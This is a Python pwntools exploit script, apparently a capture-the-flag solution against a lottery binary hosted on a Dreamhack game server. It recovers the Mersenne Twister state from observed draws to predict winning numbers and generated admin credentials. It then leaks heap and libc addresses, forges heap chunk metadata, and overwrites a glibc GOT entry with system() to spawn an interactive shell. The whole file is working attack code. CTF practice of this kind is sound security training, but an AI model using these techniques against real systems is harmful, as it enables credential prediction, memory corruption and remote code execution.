from pwn import *

HOST = 'localhost'
PORT = 20010
REMOTE = True
context.log_level = 'debug'

class MTCracker:
    TemperingMaskB = 0x9d2c5680
    TemperingMaskC = 0xefc60000
    N = 624
    F = 1812433253
    def __init__(self, output):
        self.output: list = output
    
    def undoTemperShiftL(self, y: int) -> int:
        last14 = y >> 18;
        final = y ^ last14
        return final
    
    def undoTemperShiftT(self, y: int) -> int:
        first17 = y << 15
        final = y ^ (first17 & self.TemperingMaskC)
        return final
    
    def undoTemperShiftS(self, y: int) -> int:
        a = y << 7
        b = y ^ (a & self.TemperingMaskB)
        c = b << 7
        d = y ^ (c & self.TemperingMaskB)
        e = d << 7
        f = y ^ (e & self.TemperingMaskB)
        g = f << 7
        h = y ^ (g & self.TemperingMaskB)
        i = h << 7
        final = y ^ (i & self.TemperingMaskB)
        return final
    
    def undoTemperShiftU(self, y: int) -> int:
        a = y >> 11
        b = y ^ a
        c = b >> 11
        final = y ^ c
        return final

    def untemper(self, y: int) -> int:
        _y = self.undoTemperShiftL(y)
        _y = self.undoTemperShiftT(_y)
        _y = self.undoTemperShiftS(_y)
        _y = self.undoTemperShiftU(_y)
        return _y
    
    def crack(self) -> list:
        return [self.untemper(y) for y in self.output]

    def temper(self, y) -> int:
        _y = y
        _y ^= (_y >> 11)
        _y ^= (_y << 7) & 0x9d2c5680
        _y ^= (_y << 15) & 0xefc60000
        _y ^= (_y >> 18)
        return _y

    def check(self, tempers, untempers) -> bool:
        for x, y in zip(tempers, untempers):
            if self.untemper(x) != y:
                return False
            
        return True

class MTwister:
    N = 624
    M = 397
    F = 1812433253
    MATRIX_A = 0x9908b0df
    UPPER_MASK = 0x80000000
    LOWER_MASK = 0x7fffffff
    W = 32
    R = 31
    mag01 = [0x0, MATRIX_A]
    def __init__(self, seed=0):
        self.mt: list = [0 for _ in range(624)]
        self.mti: int = 624
        self.mt[0] = seed & 0xffffffff

    def init_genrand(self):
        for _mti in range(1, self.N):
            self.mt[_mti] = (self.F * (self.mt[_mti-1] ^ (self.mt[_mti-1] >> 30)) + _mti)
            self.mt[_mti] &= 0xffffffff

    def set_state(self, output): 
        for i in range(self.N):
            self.mt[i] = output[i]
        self.mti = 0
    def genrand_uint32(self) -> int:
        if self.mti >= 624:
            for kk in range(self.N - self.M):
                y = (self.mt[kk] & self.UPPER_MASK) | (self.mt[kk+1] & self.LOWER_MASK)
                self.mt[kk] = self.mt[kk+self.M] ^ (y >> 1) ^ self.mag01[y & 0x1]
            for kk in range(self.N - self.M, self.N - 1):
                y = (self.mt[kk] & self.UPPER_MASK) | (self.mt[kk+1] & self.LOWER_MASK)
                self.mt[kk] = self.mt[kk+(self.M - self.N)] ^ (y >> 1) ^ self.mag01[y & 0x1]
            y = (self.mt[self.N-1] & self.UPPER_MASK) | (self.mt[0] & self.LOWER_MASK)
            self.mt[self.N-1] = self.mt[self.M-1] ^ (y >> 1) ^ self.mag01[y & 0x1]
            self.mti = 0
        y = self.mt[self.mti]
        self.mti+=1
        y ^= (y >> 11)
        y ^= (y << 7) & 0x9d2c5680
        y ^= (y << 15) & 0xefc60000
        y ^= (y >> 18)
        return y

elf = ELF('./main')

if REMOTE:
    HOST = 'host3.dreamhack.games'
    PORT = 16554
    io = remote(HOST, PORT)
else:
    io = process('./main')
    libc = elf.libc

def lotto(arr: list, size=0, name="", desc="", is_win=False) -> list | None:
    io.sendlineafter('> ', '1') 
    for x in arr:
        io.sendlineafter('> ', str(x))

    if not is_win:
        io.sendlineafter('> ', 'y')
        io.sendlineafter('>', '0')
        io.recvuntil('Lotto Numbers : ')
        return eval(io.recvuntil(']')[:-3]+b']')
    
    else:
        io.sendlineafter('size > ', str(size))
        io.sendafter('name > ', name)
        io.sendafter('description > ', desc)

mt_output = []

for i in range(624 // 6):
    mt_output += lotto([1,2,3,4,5,6])[8:14]

assert len(mt_output) == 624
cracker = MTCracker(mt_output)
mt = cracker.crack()
assert cracker.check(mt_output, mt)

mtwister = MTwister()
mtwister.set_state(mt)
assert [mtwister.genrand_uint32() for _ in range(624)] == mt_output

for _ in range(0x10+1):
    next_lotto = [(mtwister.genrand_uint32() % 45) + 1 for _ in range(6)]
    lotto(next_lotto, 24, 'a'*23, 'b'*0xf, is_win=True)

def admin(id: str, pw: str):
    io.sendlineafter('> ', str(0x1007))
    io.sendafter('> ', id)
    io.sendafter('> ', pw)

ID =  'admin'+hex(mtwister.genrand_uint32())[2:].upper().rjust(0x8, '0')
PW = hex(mtwister.genrand_uint32())[2:].upper().rjust(0x8, '0')

io.sendlineafter('> ', '2')
data = io.recvuntil('[1]').split(b'[0] name : ')[1]
idx = data.find(b'U')+1
heap_leak = u64(data[idx-6:idx]+b'\x00\x00')
heap_base = heap_leak - 0xcf0
io.success(f'heap base @ {hex(heap_base)}')
print(ID, PW)
admin(ID, PW)
io.sendlineafter('> ', '0')

payload = b'a'*24 + p64(0x21) + b'a' * 0x10 + p64(0x0) + p64(0x21) + p64(heap_base + 0xd30) * 2
payload += data[len(payload):0x630]
print(data)

io.sendafter('name > ', payload + p64(0x0) + p64(0xd41))
io.sendafter('> ', 'asdf')

io.sendlineafter('> ', '1')
next_lotto = [(mtwister.genrand_uint32() % 45) + 1 for _ in range(6)]
for x in next_lotto:
    io.sendlineafter('> ', str(x))

next_lotto = [(mtwister.genrand_uint32() % 45) + 1 for _ in range(6)]

lotto(next_lotto, 0xe00, 'a'*1, 'b'*1, is_win=True)
io.sendlineafter('> ', '2')
libc = u64(io.recvuntil(b'\x7f')[-6:]+b'\x00\x00')
io.recvuntil('[1] description : ')
if REMOTE:
    libc_base = libc - 96 - 0x21ac80
    system = libc_base + 0x50d70
else:
    libc_base = libc - 96 - 0x21ac80
    system = libc_base + libc.symbols['system']
io.success(f'libc_base @ {hex(libc_base)}')

ID = 'admin'+hex(mtwister.genrand_uint32())[2:].upper()
PW = hex(mtwister.genrand_uint32())[2:].upper()

admin(ID, PW)
io.sendlineafter('> ', '1')

payload = p64(libc_base + 0x21a098) # glibc 2.35 libc got call printf => strlen@libc_got
io.sendafter('name > ', payload)
io.sendafter('> ', payload)

ID =  'admin'+hex(mtwister.genrand_uint32())[2:].upper()
PW = hex(mtwister.genrand_uint32())[2:].upper()

admin(ID, PW)
pause()
io.sendlineafter('> ', '2')
io.sendafter('> ', p64(system))
io.sendafter('> ', p64(system))

io.sendlineafter('> ', str(0x1007))
io.sendafter('> ', 'sh\x00')
io.sendafter('> ', 'sh\x00')
# printf("sh") => strlen("sh") => system("sh")

io.interactive()
